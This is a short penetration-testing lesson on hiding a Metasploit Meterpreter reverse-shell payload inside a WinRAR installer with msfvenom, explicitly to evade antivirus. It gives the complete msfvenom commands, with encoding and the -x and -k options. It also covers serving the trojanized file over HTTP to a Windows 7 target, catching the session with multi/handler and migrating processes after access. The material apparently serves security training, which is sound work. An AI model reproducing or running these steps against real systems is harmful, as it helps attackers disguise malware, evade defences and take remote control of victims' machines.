# Injecting Payloads Into Windows Portable Executables

This lesson is a technical demonstration. Note that the objective of injecting payloads into windows portable executables is bypassing AV systems.

## Laboratory

For this technical demonstration we won't need a lab environment. We can follow along using a simple kali virtual machine.

- First, we need a portable executable to inject the payload into it. One of the best options is WinRAR. For this case, we will need the 32 bit (x86) winrar setup from the official website.

- We will use the same example we used in the previous lesson but we will add the -x option to specify the executable we want to inject the payload in `msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe -x ~/path/to/winrar.exe > ~/path/to/encoded/payload.exe` if you got no errors, the injection process should have succeded.

### Transfering Payload to the target

- To transfer the malicious payloads to the target machine, in this case we will only target windows windows. We need to have a windows 7 machine in the same network as our kali machine. We are going to setup a simple http web server and try to download the payloads to the windows machine from a web browser. Once we setup the web server, we are going to set up the listener using the msfconsole module `multihandler`. We only need to run `use multi/handler` inside the msfconsole and change the payload to the payload we crafted using msfvenom. And we also need to configure the LHOST and LPORT we configured in the payload with msfvenom.

**Note**: When using meterpreter payloads, we need to use the multihandler module to properly handle the connection. Simpler handlers like netcat could not work properly.

- From the windows target machine, enter the browser and download the payloads. Execute them and then you should see something happening on your kali machine, it should open a meterpreter session on the multihandler.

**Note**: It is importance to notice that the real functionality of the executable is not kept, we replaced it with the payload. This doesn't happen with the information of the file, it will keep the file description and company name.

**Note**: After gaining initial access in windows, it is recommended to `run` the post exploitation module `post/windows/manage/migrate`.

### Keeping original functionality of the executable

- This doesn't usually work and we can prove it won't work on winrar by using the same example as before but adding the option -k `msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe -k -x ~/path/to/winrar.exe > ~/path/to/encoded/payload.exe`. Note the error at the end. You could eventually find an executable with enough testing and error.

**Note**: This attack vector is really not used anymore, as the new AV solutions have huge signature databases and better detection techniques. This could be useful for older and rudimentary AV solutions like Windows Defender in Windows 7 and in some cases in new AV, but it is not the method utilized in regards to client side attacks because of the limitations of encoding.
